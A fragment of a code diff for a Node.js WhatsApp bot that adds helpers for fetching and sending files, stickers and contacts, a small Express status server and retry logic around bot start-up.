+        else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
+        if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid;
+        else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid;
+        copy.key.remoteJid = jid;
+        copy.key.fromMe = sender === conn.user.id;
+        return proto.WebMessageInfo.fromObject(copy);
+    };
+
+    conn.getFile = async(PATH, save) => {
+        let res;
+        let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0);
+        let type = await FileType.fromBuffer(data) || {
+            mime: 'application/octet-stream',
+            ext: '.bin'
+        };
+        let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext);
+        if (data && save) fs.promises.writeFile(filename, data);
+        return {
+            res,
+            filename,
+            size: await getSizeMedia(data),
+            ...type,
+            data
+        };
+    };
+
+    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
+        let types = await conn.getFile(PATH, true);
+        let { filename, size, ext, mime, data } = types;
+        let type = '', mimetype = mime, pathFile = filename;
+        if (options.asDocument) type = 'document';
+        if (options.asSticker || /webp/.test(mime)) {
+            let { writeExif } = require('./exif.js');
+            let media = { mimetype: mime, data };
+            pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] });
+            await fs.promises.unlink(filename);
+            type = 'sticker';
+            mimetype = 'image/webp';
+        } else if (/image/.test(mime)) type = 'image';
+        else if (/video/.test(mime)) type = 'video';
+        else if (/audio/.test(mime)) type = 'audio';
+        else type = 'document';
+        await conn.sendMessage(jid, {
+            [type]: { url: pathFile },
+            mimetype,
+            fileName,
+            ...options
+        }, { quoted, ...options });
+        return fs.promises.unlink(pathFile);
+    };
+
+    conn.parseMention = async(text) => {
+        return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
+    };
+
+    conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
+        let list = [];
+        for (let i of kon) {
+            list.push({
+                displayName: await conn.getName(i + '@s.whatsapp.net'),
+                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
+            });
+        }
+        conn.sendMessage(jid, {
+            contacts: {
+                displayName: `${list.length} Contact`,
+                contacts: list,
+            },
+            ...opts,
+        }, { quoted });
+    };
+
+    conn.setStatus = status => {
+        conn.query({
+            tag: 'iq',
+            attrs: {
+                to: '@s.whatsapp.net',
+                type: 'set',
+                xmlns: 'status',
+            },
+            content: [{
+                tag: 'status',
+                attrs: {},
+                content: Buffer.from(status, 'utf-8'),
+            }],
+        });
+        return status;
+    };
+    
+    conn.serializeM = mek => sms(conn, mek, store);
+}
+
+app.get("/", (req, res) => {
+    res.send("BOSS-MD⁸⁷³ STARTED ✅");
+});
+
+app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
+
+// ✅ FIXED: Start bot with proper error handling
 setTimeout(() => {
-    connectToWA();
-}, 8000);
+    connectToWA().catch(err => {
+        console.error("❌ Failed to start bot:", err.message);
+        console.log("🔄 Retrying in 5 seconds...");
+        setTimeout(() => connectToWA(), 5000);
+    });
+}, 5000);
 
-// ==================== PROCESS HANDLERS ====================
 process.on('SIGINT', () => {
     console.log('Cleaning up before exit...');
     if (memoryCleanInterval) clearInterval(memoryCleanInterval);
@@ -1089,17 +1026,3 @@ process.on('uncaughtException', (err) => {
 process.on('unhandledRejection', (reason, promise) => {
     console.error('Unhandled Rejection at:', promise, 'reason:', reason);
 });
-
-console.log("\n🚀 ==============================");
-console.log("🚀 𝙼𝙰𝚁𝙲𝙾 𝙼𝙰𝙻𝙸𝙺 BOT STARTING...");
-console.log("🚀 ==============================\n");
-
-// ==================== EXPORTS FOR PLUGINS ====================
-module.exports = {
-    commands,
-    aliases,
-    prefix,
-    ownerNumber,
-    config,
-    conn
-};
